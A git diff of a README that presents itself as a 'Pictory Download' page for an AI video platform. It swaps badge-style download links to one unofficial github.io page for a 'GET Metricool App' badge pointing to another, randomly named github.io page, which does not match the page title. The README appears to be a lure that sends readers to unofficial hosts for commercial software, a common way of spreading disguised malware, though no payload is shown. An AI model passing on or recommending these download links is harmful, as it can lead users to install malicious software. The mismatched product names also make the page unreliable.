@@ -1,18 +1,6 @@
 # Pictory Download — AI Video Platform
 
-<a href="https://git-apps-io.github.io/.github/?offer=Pictory" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Pictory%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Pictory for macOS">
-</a>
-
-<a href="https://git-apps-io.github.io/.github/?offer=Pictory" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Pictory%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Pictory for Windows">
-</a>
+[![GET Metricool App](https://img.shields.io/badge/GET%20%E2%80%94%20Metricool-App-0078D6?style=for-the-badge&logoColor=white)](https://szumigalavorce90.github.io/.github/Metricool-App)
 
 ---
 
